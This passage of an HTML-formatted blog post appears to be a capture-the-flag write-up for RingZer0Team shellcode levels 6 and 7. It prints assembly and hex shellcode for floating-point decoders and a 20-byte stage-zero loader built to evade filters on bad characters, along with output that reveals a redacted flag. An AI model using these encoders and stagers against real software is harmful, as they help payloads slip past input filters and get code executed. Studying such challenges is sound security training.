</span><span class='line'><span class="k">print</span> <span class="n">commands</span>
</span><span class='line'><span class="k">print</span> <span class="n">defines</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;&quot;&quot;</span>
</span><span class='line'><span class="s">_decoder:</span>
</span><span class='line'><span class="s">xor ebx,ebx</span>
</span><span class='line'><span class="s">mov cl, (_a{}-_start)/4</span>
</span><span class='line'><span class="s">mov bl, (_b{}-_start)/4</span>
</span><span class='line'><span class="s">_decodeloop:</span>
</span><span class='line'><span class="s">fild dword [rax+rbx*4]</span>
</span><span class='line'><span class="s">dec bl</span>
</span><span class='line'><span class="s">fiadd dword [rax+rcx*4]</span>
</span><span class='line'><span class="s">fistp dword [rax+rcx*4]</span>
</span><span class='line'><span class="s">loop _decodeloop</span>
</span><span class='line'><span class="s">jmp _a0</span>
</span><span class='line'>
</span><span class='line'><span class="s">&quot;&quot;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">num_commands</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">num_commands</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This generated the following assembly:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bits</span> <span class="mi">64</span>
</span><span class='line'>
</span><span class='line'><span class="n">_start</span><span class="p">:</span>
</span><span class='line'><span class="n">_stage0</span><span class="p">:</span>                <span class="p">;</span> <span class="n">stage0</span> <span class="n">will</span> <span class="n">carve</span> <span class="n">out</span> <span class="n">stage1</span>
</span><span class='line'><span class="n">xor</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
</span><span class='line'><span class="n">jmp</span> <span class="n">_decoder</span>
</span><span class='line'>
</span><span class='line'><span class="n">_a0</span> <span class="n">dd</span> <span class="mh">0x11101010</span>
</span><span class='line'><span class="n">_a1</span> <span class="n">dd</span> <span class="mh">0x2b1f1520</span>
</span><span class='line'><span class="n">_a2</span> <span class="n">dd</span> <span class="mh">0x10111a82</span>
</span><span class='line'><span class="n">_a3</span> <span class="n">dd</span> <span class="mh">0x89101010</span>
</span><span class='line'><span class="n">_a4</span> <span class="n">dd</span> <span class="mh">0x10101110</span>
</span><span class='line'><span class="n">_a5</span> <span class="n">dd</span> <span class="mh">0x11101010</span>
</span><span class='line'><span class="n">_a6</span> <span class="n">dd</span> <span class="mh">0x10101010</span>
</span><span class='line'><span class="n">_a7</span> <span class="n">dd</span> <span class="mh">0x10101120</span>
</span><span class='line'>
</span><span class='line'><span class="n">_b0</span> <span class="n">dd</span> <span class="mh">0x3fb02138</span>
</span><span class='line'><span class="n">_b1</span> <span class="n">dd</span> <span class="mh">0x3f3f3f3f</span>
</span><span class='line'><span class="n">_b2</span> <span class="n">dd</span> <span class="mh">0xf4fe3ffd</span>
</span><span class='line'><span class="n">_b3</span> <span class="n">dd</span> <span class="mh">0xfe37f2a0</span>
</span><span class='line'><span class="n">_b4</span> <span class="n">dd</span> <span class="mh">0x37f4fee7</span>
</span><span class='line'><span class="n">_b5</span> <span class="n">dd</span> <span class="mh">0xfe863887</span>
</span><span class='line'><span class="n">_b6</span> <span class="n">dd</span> <span class="mh">0x3ff19ff5</span>
</span><span class='line'><span class="n">_b7</span> <span class="n">dd</span> <span class="mh">0xb2f4fe3f</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">_decoder</span><span class="p">:</span>
</span><span class='line'><span class="n">xor</span> <span class="n">ebx</span><span class="p">,</span><span class="n">ebx</span>
</span><span class='line'><span class="n">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="p">(</span><span class="n">_a7</span><span class="o">-</span><span class="n">_start</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span>
</span><span class='line'><span class="n">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="p">(</span><span class="n">_b7</span><span class="o">-</span><span class="n">_start</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span>
</span><span class='line'><span class="n">_decodeloop</span><span class="p">:</span>
</span><span class='line'><span class="n">fild</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rbx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="n">dec</span> <span class="n">bl</span>
</span><span class='line'><span class="n">fiadd</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rcx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="n">fistp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rcx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="n">loop</span> <span class="n">_decodeloop</span>
</span><span class='line'><span class="n">jmp</span> <span class="n">_a0</span>
</span></code></pre></td></tr></table></div></figure>


<p>There was, however, a huge problem. The instruction <code>jmp _decoder</code> generated a bad char: <code>0x40</code>. This is because it has to jump over two times 32 bytes of data to reach the decoder, which is exactly 64 bytes. However, the shellcode is only 31 bytes long, while I store 32 bytes. That means that the last byte is redundant! I exploited this fact by making this final byte a NOP. But because it is used in the decoding process, I had to modify <code>encode.py</code> again.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">:</span>
</span><span class='line'>  <span class="c">#data += &quot;\xc3&quot;</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x8f</span><span class="s">&quot;</span>    <span class="c"># found by trial &amp; error ;)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This modifies the two last constants:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">_a7</span> <span class="n">dd</span> <span class="mh">0x90101120</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="n">_b7</span> <span class="n">dd</span> <span class="mh">0xfef4fe3f</span>
</span></code></pre></td></tr></table></div></figure>


<p>I switched them around, so that the last byte of _b7 would be the 0x90 byte. Then, I could jump there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">jmp</span> <span class="n">_b7</span><span class="o">+</span><span class="mi">3</span>           <span class="p">;</span> <span class="n">assembles</span> <span class="n">to</span> <span class="n">eb</span> <span class="mi">3</span><span class="n">f</span> <span class="o">-&gt;</span> <span class="n">no</span> <span class="n">more</span> <span class="n">badchars</span><span class="err">!</span>
</span><span class='line'>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="n">_a7</span> <span class="n">dd</span> <span class="mh">0xfef4fe3f</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'><span class="n">_b7</span> <span class="n">dd</span> <span class="mh">0x90101120</span>   <span class="p">;</span> <span class="n">this</span> <span class="n">was</span> <span class="mh">0xfef4fe3f</span> <span class="p">(</span><span class="n">little</span> <span class="n">endianess</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The working shellcode now looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bits</span> <span class="mi">64</span>
</span><span class='line'>
</span><span class='line'><span class="n">_start</span><span class="p">:</span>
</span><span class='line'><span class="n">_stage0</span><span class="p">:</span>                <span class="p">;</span> <span class="n">stage0</span> <span class="n">will</span> <span class="n">carve</span> <span class="n">out</span> <span class="n">stage1</span>
</span><span class='line'><span class="n">xor</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
</span><span class='line'><span class="n">jmp</span> <span class="n">_b7</span><span class="o">+</span><span class="mi">3</span>               <span class="p">;</span> <span class="n">jump</span> <span class="n">to</span> <span class="n">the</span> <span class="n">NOP</span><span class="p">,</span> <span class="n">avoiding</span> <span class="n">a</span> <span class="n">bad</span> <span class="n">char</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="n">_a0</span> <span class="n">dd</span> <span class="mh">0x11101010</span>
</span><span class='line'><span class="n">_a1</span> <span class="n">dd</span> <span class="mh">0x2b1f1520</span>
</span><span class='line'><span class="n">_a2</span> <span class="n">dd</span> <span class="mh">0x10111a82</span>
</span><span class='line'><span class="n">_a3</span> <span class="n">dd</span> <span class="mh">0x89101010</span>
</span><span class='line'><span class="n">_a4</span> <span class="n">dd</span> <span class="mh">0x10101110</span>
</span><span class='line'><span class="n">_a5</span> <span class="n">dd</span> <span class="mh">0x11101010</span>
</span><span class='line'><span class="n">_a6</span> <span class="n">dd</span> <span class="mh">0x10101010</span>
</span><span class='line'><span class="n">_a7</span> <span class="n">dd</span> <span class="mh">0xfef4fe3f</span>
</span><span class='line'>
</span><span class='line'><span class="n">_b0</span> <span class="n">dd</span> <span class="mh">0x3fb02138</span>
</span><span class='line'><span class="n">_b1</span> <span class="n">dd</span> <span class="mh">0x3f3f3f3f</span>
</span><span class='line'><span class="n">_b2</span> <span class="n">dd</span> <span class="mh">0xf4fe3ffd</span>
</span><span class='line'><span class="n">_b3</span> <span class="n">dd</span> <span class="mh">0xfe37f2a0</span>
</span><span class='line'><span class="n">_b4</span> <span class="n">dd</span> <span class="mh">0x37f4fee7</span>
</span><span class='line'><span class="n">_b5</span> <span class="n">dd</span> <span class="mh">0xfe863887</span>
</span><span class='line'><span class="n">_b6</span> <span class="n">dd</span> <span class="mh">0x3ff19ff5</span>
</span><span class='line'><span class="n">_b7</span> <span class="n">dd</span> <span class="mh">0x90101120</span>
</span><span class='line'>
</span><span class='line'><span class="n">_decoder</span><span class="p">:</span>
</span><span class='line'><span class="n">xor</span> <span class="n">ebx</span><span class="p">,</span><span class="n">ebx</span>
</span><span class='line'>
</span><span class='line'><span class="n">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="p">(</span><span class="n">_a7</span><span class="o">-</span><span class="n">_start</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span>
</span><span class='line'><span class="n">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="p">(</span><span class="n">_b7</span><span class="o">-</span><span class="n">_start</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span>
</span><span class='line'><span class="n">_decodeloop</span><span class="p">:</span>    
</span><span class='line'><span class="n">fild</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rbx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="p">;</span> <span class="n">load</span> <span class="n">integer</span>
</span><span class='line'><span class="n">dec</span> <span class="n">bl</span>
</span><span class='line'><span class="n">fiadd</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rcx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">;</span> <span class="n">do</span> <span class="n">the</span> <span class="n">actual</span> <span class="n">decoding</span>
</span><span class='line'><span class="n">fistp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rcx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">;</span> <span class="n">store</span> <span class="n">the</span> <span class="n">decoded</span> <span class="nb">bytes</span>
</span><span class='line'><span class="n">loop</span> <span class="n">_decodeloop</span>        <span class="p">;</span> <span class="n">use</span> <span class="n">rcx</span> <span class="k">as</span> <span class="n">counter</span> <span class="ow">and</span> <span class="n">index</span>
</span><span class='line'><span class="n">jmp</span> <span class="n">_a0</span>                 <span class="p">;</span> <span class="n">jump</span> <span class="n">to</span> <span class="n">decoded</span> <span class="n">shellcode</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s run it!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">shellcode</span><span class="o">&gt;</span>\<span class="n">x31</span>\<span class="n">xc9</span>\<span class="n">xeb</span>\<span class="n">x3f</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x11</span>\<span class="n">x20</span>\<span class="n">x15</span>\<span class="n">x1f</span>\<span class="n">x2b</span>\<span class="n">x82</span>\<span class="n">x1a</span>\<span class="n">x11</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x89</span>\<span class="n">x10</span>\<span class="n">x11</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x11</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x10</span>\<span class="n">x3f</span>\<span class="n">xfe</span>\<span class="n">xf4</span>\<span class="n">xfe</span>\<span class="n">x38</span>\<span class="n">x21</span>\<span class="n">xb0</span>\<span class="n">x3f</span>\<span class="n">x3f</span>\<span class="n">x3f</span>\<span class="n">x3f</span>\<span class="n">x3f</span>\<span class="n">xfd</span>\<span class="n">x3f</span>\<span class="n">xfe</span>\<span class="n">xf4</span>\<span class="n">xa0</span>\<span class="n">xf2</span>\<span class="n">x37</span>\<span class="n">xfe</span>\<span class="n">xe7</span>\<span class="n">xfe</span>\<span class="n">xf4</span>\<span class="n">x37</span>\<span class="n">x87</span>\<span class="n">x38</span>\<span class="n">x86</span>\<span class="n">xfe</span>\<span class="n">xf5</span>\<span class="n">x9f</span>\<span class="n">xf1</span>\<span class="n">x3f</span>\<span class="n">x20</span>\<span class="n">x11</span>\<span class="n">x10</span>\<span class="n">x90</span>\<span class="n">x31</span>\<span class="n">xdb</span>\<span class="n">xb1</span>\<span class="n">x08</span>\<span class="n">xb3</span>\<span class="n">x10</span>\<span class="n">xdb</span>\<span class="n">x04</span>\<span class="n">x98</span>\<span class="n">xfe</span>\<span class="n">xcb</span>\<span class="n">xda</span>\<span class="n">x04</span>\<span class="n">x88</span>\<span class="n">xdb</span>\<span class="n">x1c</span>\<span class="n">x88</span>\<span class="n">xe2</span>\<span class="n">xf3</span>\<span class="n">xeb</span>\<span class="n">xab</span>
</span><span class='line'>  <span class="n">Shellcode</span> <span class="n">received</span><span class="o">...</span>
</span><span class='line'>  <span class="n">Shellcode</span> <span class="n">length</span> <span class="p">(</span><span class="mi">89</span><span class="p">)</span> <span class="nb">bytes</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">Success</span><span class="p">:</span> <span class="n">Executing</span> <span class="n">shellcode</span><span class="o">...</span>
</span><span class='line'>
</span><span class='line'><span class="o">/</span><span class="n">flag</span><span class="o">/</span><span class="n">level6</span><span class="o">.</span><span class="n">flag</span><span class="o">^</span><span class="err">@</span>
</span><span class='line'><span class="n">FLAG</span><span class="o">-&lt;</span><span class="n">redacted</span><span class="o">&gt;</span>
</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">ringzer0team</span><span class="o">.</span><span class="n">com</span> <span class="n">closed</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Got it with <em>one</em> byte to spare!</p>

<h2>Level 7: Ultra-Violence</h2>

<p>OK, I thought the last level was pretty hard, having to resort to floating point instructions to carve out a shellcode. I was shocked to see the description for level 7:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">This</span> <span class="n">level</span> <span class="n">have</span> <span class="n">shellcode</span> <span class="n">restriction</span><span class="o">.</span> <span class="n">Bad</span> <span class="n">char</span> <span class="nb">list</span> <span class="s">&quot;</span><span class="se">\x0a\x0d\x2f\xff\x0f\x05\x68</span><span class="s"> and </span><span class="se">\x30</span><span class="s"> to </span><span class="se">\x81</span><span class="s">&quot;</span> <span class="nb">max</span> <span class="n">size</span> <span class="mi">40</span> <span class="nb">bytes</span><span class="o">.</span>
</span><span class='line'><span class="n">For</span> <span class="n">an</span> <span class="n">unknown</span> <span class="n">funky</span> <span class="n">reason</span> <span class="n">I</span> <span class="n">decide</span> <span class="n">to</span> <span class="n">add</span> <span class="n">couple</span> <span class="n">of</span> <span class="n">random</span> <span class="nb">bytes</span> <span class="ow">in</span> <span class="n">your</span> <span class="nb">buffer</span> <span class="n">after</span> <span class="n">the</span> <span class="n">twentieth</span> <span class="n">character</span><span class="o">.</span>
</span><span class='line'><span class="n">Random</span> <span class="n">chunk</span> <span class="n">of</span> <span class="nb">bytes</span> <span class="n">size</span> <span class="ow">is</span> <span class="n">based</span> <span class="n">on</span> <span class="s">&quot;rand() % 20&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Waaaaat. A shit-ton of bad chars, plus it seems I couldn&rsquo;t trust whatever I sent after the twentieth bytes. This effectively cut my shellcode size to <em>just twenty bytes</em>. I could never send in a stage0 that would carve out the real shellcode, as there was simply not enough space. Instead, my stage 0 would have to read in the shellcode from the socket directly. So, I needed a way to call <code>syscall</code> to read from stdin. However, <code>0x0f</code> and <code>0x05</code> are badchars. Furthermore, where exactly would I store this newly read shellcode?</p>

<p>Here&rsquo;s what I came up with. I&rsquo;ll dump out stage 0 and explain it, going bit by bit (just as I did when making this monstrosity). This assembles to <em>exactly</em> 20 bytes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bits</span> <span class="mi">64</span>
</span><span class='line'><span class="n">_start</span><span class="p">:</span>                 
</span><span class='line'><span class="n">add</span> <span class="n">al</span><span class="p">,</span> <span class="n">_syscall</span><span class="o">-</span><span class="n">_start</span>
</span><span class='line'><span class="n">fldz</span>                   
</span><span class='line'><span class="n">fsub</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>       
</span><span class='line'><span class="n">fistp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>      
</span><span class='line'><span class="n">sbb</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span>          
</span><span class='line'><span class="n">xchg</span> <span class="n">esi</span><span class="p">,</span> <span class="n">edi</span>         
</span><span class='line'><span class="n">sbb</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span>          
</span><span class='line'><span class="n">mov</span> <span class="n">dl</span><span class="p">,</span> <span class="mh">0xf0</span>         
</span><span class='line'><span class="n">_syscall</span><span class="p">:</span>
</span><span class='line'><span class="n">dd</span> <span class="o">-</span><span class="mf">84907592.0</span>          
</span></code></pre></td></tr></table></div></figure>


<p>First things first, we need some way to decode an encoded version of <code>syscall</code>. Again, I turned to floating point instructions. I could a zero and then subtract another float; I might be able to get the resulting integer to decode to <code>syscall</code>!</p>

<p>Due to the size limitation, I could only encode four bytes. The rest of the shellcode would not only need to take care of decoding these four bytes, but also setting up the registers for <code>syscall read</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bits</span> <span class="mi">64</span>
</span><span class='line'><span class="n">_start</span><span class="p">:</span>                 <span class="p">;</span> <span class="n">shellcode</span> <span class="n">stage0</span><span class="p">:</span> <span class="n">read</span> <span class="ow">in</span> <span class="n">stage1</span>
</span><span class='line'><span class="n">add</span> <span class="n">al</span><span class="p">,</span> <span class="n">_syscall</span><span class="o">-</span><span class="n">_start</span> <span class="p">;</span> <span class="n">point</span> <span class="n">rax</span> <span class="n">to</span> <span class="n">encoded</span> <span class="n">instruction</span>
</span></code></pre></td></tr></table></div></figure>


<p>I didn&rsquo;t care anymore about using <code>rcx</code> as a counter and index. I needed to adjust the pointer to the right address, which contained an encoded dword. The decoding of this dword is handle by these instructions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">fldz</span>                    <span class="p">;</span> <span class="n">setup</span> <span class="n">st0</span>
</span><span class='line'><span class="n">fsub</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>        <span class="p">;</span> <span class="n">subtract</span> <span class="n">encoded</span> <span class="n">instruction</span>
</span><span class='line'><span class="n">fistp</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>       <span class="p">;</span> <span class="n">store</span> <span class="n">them</span> <span class="n">again</span>
</span></code></pre></td></tr></table></div></figure>


<p>The dword that I chose to encode were actually these instructions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bits</span> <span class="mi">64</span>
</span><span class='line'><span class="n">xchg</span> <span class="n">rax</span><span class="p">,</span><span class="n">rsi</span>
</span><span class='line'><span class="n">syscall</span>
</span></code></pre></td></tr></table></div></figure>


<p>These would assembled to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">$</span> <span class="n">xxd</span> <span class="n">small</span>
</span><span class='line'><span class="mo">0000000</span><span class="p">:</span> <span class="mi">4896</span> <span class="mi">0</span><span class="n">f05</span>
</span></code></pre></td></tr></table></div></figure>


<p>I then turned to python:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">$</span> <span class="n">python</span>
</span><span class='line'><span class="n">Python</span> <span class="mf">2.7</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">Mar</span> <span class="mi">13</span> <span class="mi">2014</span><span class="p">,</span> <span class="mi">11</span><span class="p">:</span><span class="mo">03</span><span class="p">:</span><span class="mi">55</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="n">GCC</span> <span class="mf">4.7</span><span class="o">.</span><span class="mi">2</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux2</span>
</span><span class='line'><span class="n">Type</span> <span class="s">&quot;help&quot;</span><span class="p">,</span> <span class="s">&quot;copyright&quot;</span><span class="p">,</span> <span class="s">&quot;credits&quot;</span> <span class="ow">or</span> <span class="s">&quot;license&quot;</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="mh">0x050f9648</span>
</span><span class='line'><span class="mi">84907592</span>
</span></code></pre></td></tr></table></div></figure>


<p>I was lucked out here. I tried many things, but this value, stored as a negative float, did <strong>not</strong> contain any bad chars!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">sbb</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span>            <span class="p">;</span> <span class="nb">set</span> <span class="n">rsi</span> <span class="n">to</span> <span class="n">zero</span>
</span><span class='line'><span class="n">xchg</span> <span class="n">esi</span><span class="p">,</span> <span class="n">edi</span>           <span class="p">;</span> <span class="n">used</span> <span class="k">for</span> <span class="n">edi</span> <span class="o">-&gt;</span> <span class="n">stdin</span>
</span><span class='line'><span class="n">sbb</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span>            <span class="p">;</span> <span class="nb">set</span> <span class="n">rsi</span> <span class="n">to</span> <span class="n">zero</span><span class="p">,</span> <span class="n">used</span> <span class="k">for</span> <span class="n">rax</span> <span class="o">-&gt;</span> <span class="n">read</span>
</span><span class='line'><span class="n">mov</span> <span class="n">dl</span><span class="p">,</span> <span class="mh">0xf0</span>            <span class="p">;</span> <span class="n">read</span> <span class="ow">in</span> <span class="mh">0xf0</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">hopefully</span> <span class="n">enough</span>
</span><span class='line'><span class="n">_syscall</span><span class="p">:</span>
</span><span class='line'><span class="n">dd</span> <span class="o">-</span><span class="mf">84907592.0</span>          <span class="p">;</span> <span class="n">this</span> <span class="ow">is</span> <span class="n">actually</span> <span class="n">xchg</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rsi</span><span class="p">;</span> <span class="n">syscall</span> <span class="n">but</span> <span class="n">encoded</span> <span class="k">as</span> <span class="n">a</span> <span class="nb">float</span><span class="err">!</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>sbb</code> instruction is just another way of saying <code>sub esi, esi</code>. The <code>sub</code> instruction contains a bad char. Operations on <code>rsi</code> and <code>rdi</code> contained bad chars, but using <code>esi</code> and <code>edi</code> still had the desired effect of zeroing out the registers.</p>

<p>Finally, just before the <code>syscall</code> would be executed, the registers look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">rsi</span><span class="p">:</span> <span class="n">address</span> <span class="n">of</span> <span class="n">_syscall</span>
</span><span class='line'><span class="n">rdi</span><span class="p">:</span> <span class="n">zero</span> <span class="p">(</span><span class="n">stdin</span><span class="p">)</span>
</span><span class='line'><span class="n">rax</span><span class="p">:</span> <span class="n">zero</span> <span class="p">(</span><span class="n">syscall</span> <span class="n">read</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Upon executing the syscall, code execution will go into kernel space, reading from stdin <em>to</em> the address of _syscall, overwriting the instructions that come after it.</p>

